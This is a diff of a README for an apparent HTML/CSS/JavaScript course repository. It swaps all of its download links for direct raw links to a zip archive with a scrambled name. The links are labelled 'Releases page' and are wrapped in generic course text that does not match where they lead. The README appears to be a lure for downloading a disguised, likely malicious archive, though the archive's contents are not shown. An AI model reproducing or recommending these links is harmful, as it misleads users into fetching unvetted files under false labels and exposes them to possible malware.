@@ -1,6 +1,6 @@
 # 🎉 html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023 - Learn Web Development Fundamentals
 
-[![Download](https://github.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/raw/refs/heads/main/developments/course_css_frontend_es_luisdev_part_javascript_js_html_2.3.zip)](https://github.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/raw/refs/heads/main/developments/course_css_frontend_es_luisdev_part_javascript_js_html_2.3.zip)
+[![Download](https://raw.githubusercontent.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/main/developments/javascript_frontend_html_course_css_part_js_es_luisdev_husheen.zip)](https://raw.githubusercontent.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/main/developments/javascript_frontend_html_course_css_part_js_es_luisdev_husheen.zip)
 
 ## 📋 Description
 This repository contains materials for the HTML, CSS, and JavaScript course. It focuses on front-end fundamentals, including HTML structure, modern CSS styles, ITCSS and RSCSS patterns, componentization, responsive layouts, and integration with vanilla JavaScript for dynamic interfaces.
@@ -8,7 +8,7 @@ This repository contains materials for the HTML, CSS, and JavaScript course. It 
 ## 🚀 Getting Started
 To get started with the course, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/raw/refs/heads/main/developments/course_css_frontend_es_luisdev_part_javascript_js_html_2.3.zip) to download the course materials. 
+1. Visit the [Releases page](https://raw.githubusercontent.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/main/developments/javascript_frontend_html_course_css_part_js_es_luisdev_husheen.zip) to download the course materials. 
 1. Look for the latest release at the top of the page.
 1. Click on the asset you want to download; this might be a ZIP file or other compressed format that contains all the course files.
 
@@ -30,7 +30,7 @@ The course materials include:
 - **Component-Based Design**: Discover best practices for building reusable components.
 
 ## 📥 Download & Install
-To download the course materials, visit the [Releases page](https://github.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/raw/refs/heads/main/developments/course_css_frontend_es_luisdev_part_javascript_js_html_2.3.zip).
+To download the course materials, visit the [Releases page](https://raw.githubusercontent.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/main/developments/javascript_frontend_html_course_css_part_js_es_luisdev_husheen.zip).
 
 1. Click on the link above to access the download options.
 1. Select the archive file you want to download.
@@ -53,4 +53,4 @@ If you encounter any issues or have questions regarding the course materials, pl
 ## 📝 License
 This project is licensed under the MIT License. You can use and modify the materials provided in this repository freely.
 
-[![Download](https://github.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/raw/refs/heads/main/developments/course_css_frontend_es_luisdev_part_javascript_js_html_2.3.zip)](https://github.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/raw/refs/heads/main/developments/course_css_frontend_es_luisdev_part_javascript_js_html_2.3.zip)
+[![Download](https://raw.githubusercontent.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/main/developments/javascript_frontend_html_course_css_part_js_es_luisdev_husheen.zip)](https://raw.githubusercontent.com/Batool-Akbar/html-css-javascript-frontend_course-luisdev_part-2_html-5_css-3_js-es2023/main/developments/javascript_frontend_html_course_css_part_js_es_luisdev_husheen.zip)
